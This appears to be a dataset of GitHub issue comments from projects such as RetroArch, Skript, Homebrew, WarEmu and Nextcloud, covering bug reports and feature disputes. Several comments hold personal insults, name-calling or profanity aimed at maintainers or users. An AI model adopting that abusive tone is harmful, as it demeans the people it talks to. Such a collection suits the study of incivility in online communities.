RetroArch/libretro/8551/481441626,"No one ever disputed that the correct resolution is 240x320 when rotated. What's being disputed is whether or not all the cores are reporting the correct resolution when the image is rotated. You really are failing to grasp what's going on, here. Numerous people have since recognized the issue I'm describing and the issue in FBA was both recognized and fixed. The fact that you're holding firm on this even in spite of this indicates either a willful stubbornness on your part to admit that you're wrong, or just a complete misunderstanding on your part. There are numerous ambiguities and equivocations occurring in this conversation which make it very difficult to have a meaningful discussion with you. In fact, on more than one occasion you seem to think that I'm arguing for the exact opposite of the point I'm trying to make. The question of what the default rotation behavior should be for vertical games is almost trivial. It literally only matters the first time RA is launched, after which the user can set the behavior in the frontend. The MAIN issue is getting consistent behavior across all cores, regardless of what the default behavior should be. Now, if we're discussing the SEPARATE issue of what the default behavior should be or what is technically ""correct,"" I've already said what I'm going to say about that. You can either respond directly to the points I've made or continue ignoring them, either one is fine by me. Both standalone FBA and now also the FBA core do exactly what that they should be doing by enabling rotation in the core options and enabling vertical mode in the quick menu core options, you get the correct image, which looks like this  ",,False,False,8551
RetroArch/libretro/8551/481445394,@friend clearly in not debating with you and your screenshots anymore. you clearly dont understand geometry when a rotate happens. Im not wasting more time on it with you. No offence i posted a fix details for mame2003 and plus to send this bad geometry clearly you dont understand this at a level beyond screenshots. ,,False,False,8551
RetroArch/libretro/8551/481451616,As for tate mode in mame2003 and  plus is a ccw 90 degree rotate (it was renamed to what it is now from that) so if the arcade is 90 or 270 it will rotate the same way if the user has there screen rotated in a barcade/ servo/ stand setup . If you want a no rotate option youll need to post a github issue to get it added ,,False,False,8551
RetroArch/libretro/8551/481465900,why is this still going on. The problem was AR not being updated when using some rotation option (there are at least 3 ways to achieve rotation in RA) @friend I just noticed you are setting aspect ratio to 1. Why? aspect ratio should be core provided. ,,False,False,8551
RetroArch/libretro/8551/481483688,to sum it up its to do with core rotating an image with ra the cores info updates the rotated geom. RA doesnt like it or update geometry when you do a manual rotate itself.  So you have to return the original orientation even when you rotate through RA with the core. ,,False,False,8551
RetroArch/libretro/8551/481484714,all mame cores will need updates or ra should report rotated geometry. ,,False,False,8551
RetroArch/libretro/8551/481500003,"@friend You are completely hopeless. Several other devs agreed that there’s an issue, FBA dev already agreed that there is an issue and fixed it In FBA. To deny that there is an issue at this point is pretty much insane. I’m done talking to you. ",,False,False,8551
RetroArch/libretro/8551/481501898,"@friend, yeah I don’t know why this is even still a discussion. I’m at a loss. I use custom aspect ratios with RA because I overscan some games that scale to 1120 on the y axis. Switching it to core provided didn’t change what was going on with the reported width/height and rotation, as far as I could tell. Anyway, the issue in FBA was fixed yesterday so I think this issue can be closed; rotation behavior appears to be consistent, at least from the user’s perspective. The issue of how to best handle rotation is really a separate topic that probably warrants its own issue. ",,False,False,8551
RetroArch/libretro/8551/481504574,@friend ive already done the fix for 2003 and plus linked it and described the issue you are either stupid or argumentative or clueless about whats going on i think the latter ) ,,False,False,8551
RetroArch/libretro/8551/481512478,@friend Let's please keep this respectful at the very least. That last line was unnecessary. ,,False,False,8551
SCCMdocs/MicrosoftDocs/1249/410476388,"I search ""sccm create static computer collection"", knowing that a device collection is a list of computers that is dynamically generated but I want to make a static list that does not automatically change. Result Microsoft.com -&gt; ""How to Create a Static Collection""   &lt;- Promising blah blah blah VBScript or C# code it yourself. ........what?! SCCM is painful enough with absolutely no logic in how it is designed or functions.  Why does the Documentation have to suck even worse then the product!?  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID 19ae23b9-9a79-ce32-522b-e59697716bb3 Version Independent ID 83637444-e3ce-6c02-3617-d22842fb95b6 Content Create a Static Collection - Configuration Manager Content Source sccm/develop/core/clients/collections/how-to-create-a-static-collection.md Product configuration-manager GitHub Login @friend Microsoft Alias aaroncz  ",,False,False,1249
SCCMdocs/MicrosoftDocs/1249/464136594,"The Microsoft Open Source Code of Conduct, which outlines the expectations for community interactions in and around docs.microsoft.com, is designed to help ""provide a welcoming and inspiring community for all."" The content of this issue appears to be out of sync with the code of conduct. Thank you for closing it. ",,False,False,1249
Skript/SkriptLang/1568/425498881,"Use hastebin or pastebin for errors, because it's pretty hard to read right now. Also, why set the args as , when you can just make a command without args using♠command /die` Stack trace (roughly) for solving the issue ",,False,False,1568
Skript/SkriptLang/1568/425499316,"The error indicates ""Bukkit 1.8.8-R0.1-SNAPSHOT 28.09 "" This fork of Skript does not support anything lower than 1.9 ",,False,False,1568
Skript/SkriptLang/1568/425534380," As others have said, we don't support versions of Minecraft older than 1.9. You're also using an old version of Skript. You must be using the newest version of Skript to report issues (how else do we know if your issue is already fixed or not?) Your bug is due to the function your calling not being loaded yet. Make sure your  function is in a script that is loaded before the  script.  ",,False,False,1568
Skript/SkriptLang/1568/364952194,"hi each time i add this piece of code 28.09 172442 [Server] INFO titustitus98 issued server command /sk reload drakeconomy 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! [Skript] Severe Error 28.09 172442 [Server] ERROR #!#! Could not load drakeconomy.sk 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! If you're developing an add-on for Skript this likely means that you have done something wrong. 28.09 172442 [Server] ERROR #!#! If you're a server admin however please go to  172442 [Server] ERROR #!#! and check whether this error has already been reported. 28.09 172442 [Server] ERROR #!#! If not please create a new ticket with a meaningful title, copy &amp; paste this whole error into it (or use paste service), 28.09 172442 [Server] ERROR #!#! and describe what you did before it happened and/or what you think caused the error. 28.09 172442 [Server] ERROR #!#! If you think that it's a trigger that's causing the error please post the trigger as well. 28.09 172442 [Server] ERROR #!#! By following this guide fixing the error should be easy and done fast. 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! Stack trace 28.09 172442 [Server] ERROR #!#! ch.njol.skript.SkriptAPIException Signature of function is null when return type is asked! 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.function.FunctionReference.getReturnType(FunctionReference.java201) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.function.ExprFunctionCall.getReturnType(ExprFunctionCall.java56) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.effects.EffChange.init(EffChange.java208) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.SkriptParser.parse(SkriptParser.java249) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.SkriptParser.parse(SkriptParser.java176) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.lang.Statement.parse(Statement.java61) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadItems(ScriptLoader.java754) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.command.Commands.loadCommand(Commands.java467) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadScript(ScriptLoader.java472) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.ScriptLoader.loadScripts(ScriptLoader.java271) 28.09 172442 [Server] ERROR #!#!     at ch.njol.skript.SkriptCommand.onCommand(SkriptCommand.java167) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.command.PluginCommand.execute(PluginCommand.java44) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.command.SimpleCommandMap.dispatch(SimpleCommandMap.java141) 28.09 172442 [Server] ERROR #!#!     at org.bukkit.craftbukkit.v1_8_R3.CraftServer.dispatchCommand(CraftServer.java641) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnection.handleCommand(PlayerConnection.java1162) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnection.a(PlayerConnection.java997) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PacketPlayInChat.a(PacketPlayInChat.java45) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PacketPlayInChat.a(PacketPlayInChat.java1) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.PlayerConnectionUtils$1.run(SourceFile13) 28.09 172442 [Server] ERROR #!#!     at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java511) 28.09 172442 [Server] ERROR #!#!     at java.util.concurrent.FutureTask.run(FutureTask.java266) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.SystemUtils.a(SourceFile44) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.B(MinecraftServer.java715) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.DedicatedServer.B(DedicatedServer.java374) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.A(MinecraftServer.java654) 28.09 172442 [Server] ERROR #!#!     at net.minecraft.server.v1_8_R3.MinecraftServer.run(MinecraftServer.java557) 28.09 172442 [Server] ERROR #!#!     at java.lang.Thread.run(Thread.java748) 28.09 172442 [Server] ERROR #!#!  28.09 172442 [Server] ERROR #!#! Version Information 28.09 172442 [Server] ERROR #!#!   Skript 2.2-dev25 28.09 172442 [Server] ERROR #!#!   Bukkit 1.8.8-R0.1-SNAPSHOT 28.09 172442 [Server] ERROR #!#!   Minecraft 1.8.8 28.09 172442 [Server] ERROR #!#!   Java 1.8.0_171 (Java HotSpot(TM) 64-Bit Server VM 25.171-b11) 28.09 172442 [Server] ERROR #!#!   OS Linux amd64 2.6.32-042stab127.2 28.09 172442 [Server] ERROR #!#! ` ",,False,False,1568
Skript/SkriptLang/1568/425569223,but my other leaderboard works fine ,,False,False,1568
Skript/SkriptLang/1568/425569487,"what does that have to add anything? this is super vague What code are you using for that 'other leaderboard', what version, etc. ",,False,False,1568
Skript/SkriptLang/1568/425617408,i use the exact same code with the exact same version ,,False,False,1568
Skript/SkriptLang/1568/425619135,and on the exact same server ,,False,False,1568
Skript/SkriptLang/1568/425702576,so what can i do? ,,False,False,1568
Skript/SkriptLang/1568/425706161,Update Skript and hope that it works on 1.8. This is a known bug in old releases. ,,False,False,1568
Skript/SkriptLang/1568/425709572,hi so i have updated to the latest recommended version of skript for 1.8 but bug perssists and here is my full log ,,False,False,1568
Skript/SkriptLang/1568/425709620,Use the bigger code blocks or hastebin or pastebin for errorrrs bcause this is hard to read ,,False,False,1568
Skript/SkriptLang/1568/425709661,"We do not officially support anything lower than 1.9, so you're on your own. ",,False,False,1568
Skript/SkriptLang/1568/425709698,thats not cool ,,False,False,1568
Skript/SkriptLang/1568/425709747,besides since most servers still use 1.8 you should support 1.8 ,,False,False,1568
Skript/SkriptLang/1568/425709813,Actually most servers use 1.12.2 ,,False,False,1568
Skript/SkriptLang/1568/425709832,"No, most servers support 1.12 or 1.13 and 1.8 should be left alone. You have plugins that enable 1.8 combat in 1.12 so why even bother using 1.8 ",,False,False,1568
Skript/SkriptLang/1568/425709987,idc about 1.9 compat mechanic and i simply can't just upgrade my server to a higher version just like that because some things might break and it took me months to set that server up ,,False,False,1568
Skript/SkriptLang/1568/425710081,"^ that there's no such thing as ""the latest recommended version of skript for 1.8"", just use the normal latest stable one, being dev37c, and report any bugs you have. We don't really support 1.8 but we try to keep it working (sometimes meaning that we just disable things that don't work on it) ",,False,False,1568
Skript/SkriptLang/1568/425710214,there is just go on the official skunity discord and  type in .download and it will show you it ,,False,False,1568
Skript/SkriptLang/1568/425710224,"you can't really expect us to spend the time on fixing the support for an old, long unsupported version (by Spigot too), just because ""some things might break"" (meaning you didn't even try) and you can't find the time to test stuff yourself. ",,False,False,1568
Skript/SkriptLang/1568/425710290,"♠Note that these resources are not maintained by me. If you notice something wrong with them, do not contact me.` - from the repo readme It's not as simple as just adding a line of code that says ""support 1.8 magically"". You're free to make a pull request adding support for 1.8, however if you're not willing to do this please do not just demand that. 1.8 is literally over 1000 days old and full of bugs. ",,False,False,1568
Skript/SkriptLang/1568/425710301,"well don't trust a bot on skUnity to be the 100% up-to-date official source of Skript news lol And about your error, do you have Umbaska on your server? ",,False,False,1568
Skript/SkriptLang/1568/425710660,i have updated my server to 1.12.2 but now everytime i join it kicks me and generates an Internal Exeption ,,False,False,1568
Skript/SkriptLang/1568/425710698,thank you for breaking my server ,,False,False,1568
Skript/SkriptLang/1568/425710743,thank you for not providing the stack trace ,,False,False,1568
Skript/SkriptLang/1568/425710773,then maybe you're using 1.8 plugins that dont work on 1.12 that do something with joining. idk ,,False,False,1568
Skript/SkriptLang/1568/425710813,that is why i didn't want to update to 1.12 ,,False,False,1568
Skript/SkriptLang/1568/425710866,so get the 1.12 versions of those plugins ,,False,False,1568
Skript/SkriptLang/1568/425711806,and i still can't join ,,False,False,1568
Skript/SkriptLang/1568/425711966,"This is the Skript issue tracker, for tracking issues happening in the supported versions of Minecraft. If you figure something out to make your server work on a supported version and the issue will still occur, please open a separate issue and post a gist.github.com link to the stacktrace along with the Spigot version, Skript version and a list of plugins, addons especially. If you need support with upgrading your server please ask in a more proper place like on the Spigot forums. And about your issue with Skript, I'm 95% sure it's caused by some outdated addon, please try without Umbaska to begin with, and if that doesn't help, ask on skUnity or on Skript Chat. Locking this not to hurt people's eyes more ",,False,False,1568
WarBugs/WarEmu/13182/401558318,Expected behavior and actual behavior No option to leave group - stupid crown over my head no option to disband or leave. Steps to reproduce the problem Screenshots/Videos or archive.org evidences  ,,False,False,13182
WarBugs/WarEmu/13182/456299653,So is it only the crown that disturbs? Can you join other groups or warbands? ,,False,False,13182
WarBugs/WarEmu/13182/456443685,Could not join other groups or Warbands. I just mentioned the crown as a visual indicator that I was still classed as being in a group. ,,False,False,13182
WarBugs/WarEmu/13182/456564568,Hm strange - thanks for the feedback. ,,False,False,13182
WarBugs/WarEmu/13182/456614578,Does this mean I get one of those bug report tokens for the griffon mount in Altdorf? ,,False,False,13182
WarBugs/WarEmu/13182/456688522,,,False,False,13182
WarBugs/WarEmu/13182/456842512,"Hey man what's wrong with you? Seriously. A simple no would work fine, you freak. Me and a friend reproduced this bug but forget trying to help you fix anything anymore, loser. ",,False,False,13182
WarBugs/WarEmu/13182/456846002,"We can not accept this kind of behavior. There are rules that you can find on forum. The answer of Sioding was not aggressive, while yours is. NEVER do it again. ",,False,False,13182
WarBugs/WarEmu/13182/456862280,I lock the conversation at this point. TBH It was just a quote from here ,,False,False,13182
addons-frontend/mozilla/7757/424530262,smartadblock was abusively rejected by erosman (a simple developer) in a case where the reviewer policy clearly states that more info should be requested. The extension has now been offline for 8hours? how has this guy been allowed to review extensions in the first place? ,,False,False,7757
addons-frontend/mozilla/7881/432603741,"Yeah, so... the whole Mozilla can go fuck itself. ",,False,False,7881
angular-calendar/mattlewis92/493/311889495,If we define multiline event template the next view overlaps with the first ,,False,False,493
angular-calendar/mattlewis92/493/379213708,Please follow the issue template and attach a clear plunker etc that clearly reproduces the issue you're facing. Thanks! 😄 ,,False,False,493
angular-calendar/mattlewis92/493/379219477,"the problem is that you are fixing event height in week view, if we have multiline event template it bugs ",,False,False,493
angular-calendar/mattlewis92/493/379227878,"The default demo auto truncates long event titles to handle this, if you've used a custom template I have no way of knowing what your issue is because you've written some custom code that I cannot see, hence why I asked for the plunker. &lt;img width=""268"" alt=""screen shot 2018-04-06 at 13 27 53"" src="" bear in mind that I work on this project in my spare time for free. If your company is paying you to use other peoples free software, then you should spare a few minutes of your time to follow the guidelines when reporting issues on other peoples free software. I get dozens of issues opened across my projects, and I can only spare the time to answer those that provide specific reproductions of issues. If this isn't acceptable to you, then you are more than welcome to build your own calendar component that functions exactly how you would like it to. If it's all the same to you, I would not like to engage with you further as this is a waste of energy on both sides. Best of luck with completing your project!  😄 ",,False,False,493
blueprint/palantir/2875/354864726,"Apologies to any contributors who aren't employees of Palantir. But to those that are Please find jobs elsewhere and stop helping Palantir do horrible things. Also, stop using my tools (such as Lerna), I don't support you, and I don't want my work to benefit your awful company. ",,False,False,2875
brew/Homebrew/3859/301750246,"I just did ""brew update"" which did the following ==&gt; Migrating python3 to python ==&gt; Unlinking python3 ==&gt; Unlinking python ==&gt; Moving python3 children ==&gt; Linking python I'm sure that python3 makes sense to use and is the future, but why is this change made without  prompting the user for input? This is potentially a breaking change that can affect systems. Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command? ",,False,False,3859
brew/Homebrew/3859/369908381,"This changed was announced in January  you need Python 2, ",,False,False,3859
brew/Homebrew/3859/369908976,"Also please always, always read and fill out the issue template. It tells you to do so. No Homebrew change ever prompts the user for input. ",,False,False,3859
brew/Homebrew/3859/369960418,"Furthermore the semantics of running brew update is now blurred; what am I to expect when running the command? I'd love to know the answer to this as well. How should a user guard against unexpected breaking changes? And once broken, how should users proceed and get back to getting work done? ",,False,False,3859
brew/Homebrew/3859/369962918,"In progressing levels of effort (the lowest level of which would have been sufficient in this case)  read our blog posts through the RSS feed or our Twitter feed (or the front page of Hacker News where they normally end up) watch our repository and read pull requests that seem relevant to your organisation watch our repository and test pull requests that seem relevant to your organisation before they are merged create your own tap or fork of Homebrew/homebrew-core for formulae you wish to never be changed  That's on you to figure out. We're volunteers running a project that you're using to ""get work done"" i.e. make money. Our license clearly states we disclaim all warranties and the software is available as-is. Note, your organisation could consider donating money to our project which would provide more resources to make it easier for us to do additional automated testing. ",,False,False,3859
brew/Homebrew/3859/369964089,"And to be clear This is definitely a breaking change. That's why we gave you a month and a half's notice on our primary communication mechanisms (blog on our homepage, our Twitter) to adapt to this change. If you did not do so that's on you, not us, sorry. ",,False,False,3859
brew/Homebrew/3859/369965787,@friend Would you like to explain your 👎 or would you like to just demotivate the maintainers to this project through drive-by negativity? ,,False,False,3859
brew/Homebrew/3859/369971459,"I think you are coming off angry and arrogant in your replies to this.  I think this is an issue that should be handled, and the users helped, with less arrogance and negativity from your side as well. ",,False,False,3859
brew/Homebrew/3859/369981375,"I see no mention of breaking changes or remediation steps in that blog post. If said blog is the only communication mechanism for breaking changes, that failure to communicate is on you. ",,False,False,3859
brew/Homebrew/3933/305723767,"In the past, multiple people have requested that some kind of hooks functionality be added to Homebrew. This would unnecessarily complicate Homebrew in my opinion, but the rationale behind those requests has not been given adequate consideration IMO. Rather than a generic hooks system, I would like to propose that Homebrew maintains ~/.Brewfile and keeps it up to date whenever new taps, formula, or casks are installed. This is the primary reason for all of the previous hooks requests, and I think it's a pretty legitimate one. This would allow anyone tracking their dotfiles in version control to simply add ~/.Brewfile and commit it whenever it changes. Currently, the process to do this is a bit annoying, because after every brew command, I need to manually run . It works, but it's a kludge. I'm not sure that this is relevant to 90% of Homebrew users, but it also doesn't harm anyone that doesn't want the functionality. They can simply ignore the file. I would also argue that anyone that currently has this file in place is probably already manually running the aforementioned command manually, and would be grateful for the automation. I'm happy to implement this if a PR would be welcomed. ",,False,False,3933
brew/Homebrew/3933/373634148,Homebrew has historically (and correctly in my opinion) never written any dotfiles. As you mention this is still possible with some manual work that I think is more desirable and could be wrapped with a script or function that calls  after each  run. Sorry but thanks. ,,False,False,3933
brew/Homebrew/3933/373748261,"I am not the first to suggest this, nor will I be the last. I really don't understand your rationale here, but would you be open to an opt-in approach via an environment variable or something? It's extremely unlikely that I'm going to write a script that wraps all of the brew commands and run  after some of them when it's a problem that could be very trivially solved in Homebrew itself. ",,False,False,3933
brew/Homebrew/3933/373758084,Can you link to the other suggestions? Thanks! That's up to you. ,,False,False,3933
brew/Homebrew/3933/373773643,Because it does not pass the “relevant to 90% of users” barrier. Adding a feature does not just mean writing the code. It means maintaining it (code) and supporting it (issues); dealing with every other thing that breaks because of it; and considering when weighing other features that may clash with it (even if in usability). ,,False,False,3933
brew/Homebrew/3933/373771217,Also trivial ,,False,False,3933
brew/Homebrew/3933/373794841,"@friend Please read, or re-read, our Code of Conduct and adjust your future communication accordingly. ",,False,False,3933
brew/Homebrew/3933/373779036,"Yeah, I'm aware. I maintain a widely used project as well. IMO, it still doesn't make sense to make each individual user that is affected by this problem solve it individually, even if the method for doing so is easy. ",,False,False,3933
brew/Homebrew/3933/373780120,"It does make sense in the case where it's relatively easy to do so, users cannot currently agree on how this should behave and we have a very low number of requests proportional to Homebrew (or even s) users. ",,False,False,3933
brew/Homebrew/3933/373767373,"I found these four very quickly. Hard to track them down because of the repository changes, but note that you (@friend) mentioned in  that it had been requested a few times before, so this can't be news to you.   if you want to do it correctly. It's not necessary to dump the Brewfile after  for instance. Personally, I would rather not incur the 2 second penalty on every brew command. Yes, this can be solved outside of Homebrew, but why should it not be Homebrew's issue? It's a point of friction that can be solved with zero negative consequences. ",,False,False,3933
brew/Homebrew/3933/373780912,Another option have launchd run brew bundle dump for you once an hour and forget about this forever. ,,False,False,3933
brew/Homebrew/3933/373784521,"TIL kludgy workarounds are an acceptable substitute for 20 lines of well tested, widely used code. I seriously cannot understand that mindset. You have refused to add ways for users to extend Homebrew, and you have refused to add specific functionality that users would add in third party extensions if they were able. You have essentially mandated that kludgy workarounds are the only way to get this functionality, and that's really not a great situation. If that's the barrier, then reopen this issue and let users discuss it. Tweet it out and ask for feedback. People aren't going to see/engage with it if it's closed. I would argue that literally anyone using brew bundle would benefit from this feature, even if they haven't explicitly requested it. ",,False,False,3933
brew/Homebrew/3933/373761516,Solving this in HB itself is less trivial than the alternative ♠ newbrew() {   brew ${@}   brew bundle dump --file=~/.Brewfile --force } ,,False,False,3933
brew/Homebrew/3933/373806979,"Wrapping a Unix tool with a Unix shell script is an acceptable substitute for an unknown quantity or quality of unwritten code that would be used by a minority of Homebrew's users. Untrue. Users can use and build external commands which can be shared in taps (along with formulae). That's not how we run our issue tracker, run yours how you choose. I use, have contributed more to it than anyone else and have maintained longer than anyone else both this repo and Homebrew/homebrew-bundle. I've also rolled out Homebrew/homebrew-bundle to hundreds of developers in an organisation who use it daily and built tools on top of it used by many other organisations. I would not use this feature and most of the aforementioned folks would not either. Finally, I wish I'd listened to my gut earlier and, like @friend has done, pointed you to our Code of Conduct. Unfortunately you seem unable to conduct yourself in a polite fashion so I'm uninterested in continuing this conversation. I hope that we're able to work together on a PR or issue in future but please note that continued violations of our Code of Conduct will result you being blocked from the Homebrew organisation. ",,False,False,3933
brew/Homebrew/5687/407612123,  A detailed description of the proposed feature The current behavior of  is to remove all other installed versions. If a package has previously been installed using  then  should not remove those. The motivation for the feature I'm no longer able to back down to  or reinstall it using  and the current version feels slower perceptually during the development workflow. I'm unable to debug. I also have  signified as the minimum required version for a design system I need to be able to quickly toggle back and forth between versions of this pre-1.0.0 software. How the feature would be relevant to at least 90% of Homebrew users Whatever happened to Pareto? What alternatives to the feature have been considered I could stop using using Homebrew and run the Docker container I created to build from source. ,,False,False,5687
brew/Homebrew/5687/461349912,,,False,False,5687
brew/Homebrew/5687/461360141,"We do not support installing older versions. You can use  to add it to your own tap. That's not a design principle we're adopting. Please fill out the template in future. Again, this is not helpful language. It makes no difference to us whether you choose to use Homebrew or not use whatever is best for you. You may be interested in the  variable. Please ensure you read  in future before creating issues, thanks. ",,False,False,5687
brew/Homebrew/5687/461374145,This could indeed be helpful. But I would expect 99.7 percent of developers don't want dependencies they expressly installed removed without a simple prompt for cleanup especially if Homebrew can't maintain historical packages and doesn't afford its users a method of recovery. P.s. Please work on your soft skills. ,,False,False,5687
brew/Homebrew/5687/461376984,"Please be nice with the maintainers, which work on this project on their free time. We all do our best. Watch your tone. Thanks! ",,False,False,5687
brew/Homebrew/5687/461436849,You don't want that but you are incorrect that the vast majority want that. As @friend has pointed out watch your tone. You also need to read our code of conduct  will happily communicate in whatever way you choose on the issue tracker of your open source projects but you will have to operate how we wish here. ,,False,False,5687
carbon/dawnlabs/245/298116351, Expected Behavior Actual Behavior ,,False,False,245
carbon/dawnlabs/245/366549092,Duplicate of #28 ,,False,False,245
carbon/dawnlabs/245/375919664,Running through closing issues all over the place but not actually fixing anything . What the heck do you think you are doing ? The questions are placed looking for fixes not closed stamps . Did they give you that stamp in Kindergarten? ,,False,False,245
carbon/dawnlabs/245/375919735,"""Does not accept any files or text in Palemoon browser"" ",,False,False,245
carbon/dawnlabs/245/375924474,"Hey @friend thanks for you comments. We haven't released our fix for Safari support, but I will test if on Palemoon and try and mimick that support there. ",,False,False,245
classic-bug-tracker/elysium-project/869/355814414,The Lasher's inside of Dire Maul seem to have had their loot tables recently broken.  This has happened before and was eventually fixed. Please look into this as currently the drop rates are non blizz-like. ,,False,False,869
classic-bug-tracker/elysium-project/869/417533275,"I can confirm that this is indeed true, but I would like to add that the herb spawns are broken as well. I've only been getting 1 herb spawn per reset. ",,False,False,869
classic-bug-tracker/elysium-project/869/417728785,I can confirm this. This is not Blizz-like. Please fix. Thank you ,,False,False,869
classic-bug-tracker/elysium-project/869/417751777,"Drops have been a lot less lately, few and far between. ",,False,False,869
classic-bug-tracker/elysium-project/869/417773775,I do remember when DM first came out the plants were changed from blizz like as the money influx coming from mages farming them was too much but that was a long time ago ,,False,False,869
classic-bug-tracker/elysium-project/869/417773876,Fixed. Wait for the server restart. ,,False,False,869
classic-bug-tracker/elysium-project/869/417796100,@friend do you wanna expand what you mean by fixed? ,,False,False,869
classic-bug-tracker/elysium-project/869/417901815,"@friend  The lashers are still not dropping loot like they are supposed to. Many times out of 5 packs, one or none have loot. ",,False,False,869
classic-bug-tracker/elysium-project/869/417905478,Lol dude its been 1 day has a patch even happened yet p plz remember we arent a big team like less than a handful of people who are smart and do Dev stuff ,,False,False,869
classic-bug-tracker/elysium-project/869/417941745,"still a problem, no loot from them, only sometimes a green. 0 herbs ",,False,False,869
classic-bug-tracker/elysium-project/869/418006240,Apologies for seeming inpatient. That was my misunderstanding.  I read the fix reply as it would go live at the next server reboot. We had one of those on Saturday. Thought that would cover it. Will wait for maintenance cycle.  Thank you for all your hard work and time you sink into this so we can be entertained. &lt;3 ,,False,False,869
classic-bug-tracker/elysium-project/869/418014184,Yeah shenna should of probs used to other label which ill add on now ,,False,False,869
classic-bug-tracker/elysium-project/869/418767624,do we know when to expect the fix to be applied to live? ,,False,False,869
classic-bug-tracker/elysium-project/869/418787328,It can be hard to tell. There are a lot of issues ahead of this in priority. Remember to take breaks from playing WoW its not like farming gold all day is your job P ,,False,False,869
classic-bug-tracker/elysium-project/869/418792073,I usually farm DM weekdays while at work since being a system admin has slow days if you're maintaining your systems correctly with enough preventative maintenance. It is better than staring at system stat dashboards.  Off to YouTube I go I guess ) ,,False,False,869
classic-bug-tracker/elysium-project/869/418830390,"I would like to say though, that if this was an intentional loot table change to combat gold sellers it is disappointing.  A lot of us spent time leveling mage alts specifically to farm DM as it is one of the best known farming spots in a true blizz-like setting.  I can only hope that it will revert to blizz like eventually. Thanks for all of your updates and responses on this @friend - A little communication makes a world of difference. ",,False,False,869
classic-bug-tracker/elysium-project/869/418851591,Still have entire packs with no loot. ,,False,False,869
classic-bug-tracker/elysium-project/869/418861959, i started playing on elysium when my bf wanted to try it. But a quick google search. It looks like even older servers by elysium might of done this too ,,False,False,869
classic-bug-tracker/elysium-project/869/418863192,It can be hard to tell how well combating gold sellers works but the elysium project decided they needed to do something... maybe we need a staff bot that appears when a single mage enters DM E and shows the mage a randomized scramble image of letters and numbers the player has to say correctly ;p Cleaned up this page. If youre just saying its not working thats not useful. ,,False,False,869
classic-bug-tracker/elysium-project/869/418912975,"By removing ways to get gold in game, you're literally encouraging people to buy gold. ",,False,False,869
classic-bug-tracker/elysium-project/869/418934550,Alrighty well nothing more needs to be done by me. Im unsubscribing and this thread will no longer be moderated. ,,False,False,869
contacts/nextcloud/986/419352603,"Version 3.0.5 When creating a new contact in the webapp, it submits the contact company as the contact name.  When it syncs to my phone, it shows ""Company"" in the contact list.  The name isn't present. ",,False,False,986
contacts/nextcloud/986/471452199,"GitMate.io thinks possibly related issues are  (Cant create or save contacts),  (Allow named contact events),  (Contact name displayed as ""New contact"" for contacts with only a number of enterprise name),  (Saved searches), and  (Contacts syncing over CardDav with MacOS contacts, show as company.). ",,False,False,986
contacts/nextcloud/986/471453050,"Hello, this ia done on purpose! If you don't have a valid  property, the app will try to find the closest appropriate data to use (a  data is mandatory) So it will try to generate one by using the  property, if present, or fallback to using the  property ) ",,False,False,986
contacts/nextcloud/986/471453526,"So I enter ""Vets (Hemel)"" in the name and then ""Expert Care"" in the company.  It ignores the name I give and just shows the name as ""Expert Care"" on my phone as both the name and the company. I tried several samples, with ""name name"", ""name"", name name name"", and it always uses the company. The only way to get the name is to leave company blank. ",,False,False,986
contacts/nextcloud/986/471454513,What does the nextcloud's ui displays? ,,False,False,986
contacts/nextcloud/986/471454825,"The webapp shows the correct detail in the contact list, and in the contact information. ",,False,False,986
contacts/nextcloud/986/471456041,"I note on my phone that the name of the phone number type, such as Home, is preceded by a double quote.  Not sure if this is related to the field assignments. ",,False,False,986
contacts/nextcloud/986/471461764,Possibly related to #910 ,,False,False,986
contacts/nextcloud/986/471471522,"@friend I just removed the company ""Expert Care"" from the above example and the contact in ios updated to show the name ""Vets (Hemel)"". But.... now I have a random contact in the ios contact list under ""#"" which is the number for that contact.  Doesn't appear in the nexcloud list. Something isn't right with the generated vcards. The number here is for the contact Vets above  ",,False,False,986
contacts/nextcloud/986/471475745,I will need this vcard so I can understand what's going on please ) ,,False,False,986
contacts/nextcloud/986/471478431,"If I open it in Outlook, the phone number is blank.  If I remove the quotes from TYPE=""WORK,VOICE"" it works fine. ",,False,False,986
contacts/nextcloud/986/471483811,"Okay, I'm a bit confused here, what issue are we talking about? The tel parameter quotes? The FN field being filled with the ORG's content? The iOS not displaying the contact properly? ",,False,False,986
contacts/nextcloud/986/471484534,"All of the above. If I put a company name, the number doesn't have a problem but the name does.  The ""home"" designation of a phone number shows a spurious double quote in ios. If I don't put a company name, the name is ok but the number then becomes its own contact. I can open multiple bug reports for each one, but I suspect they are all one in the same. ",,False,False,986
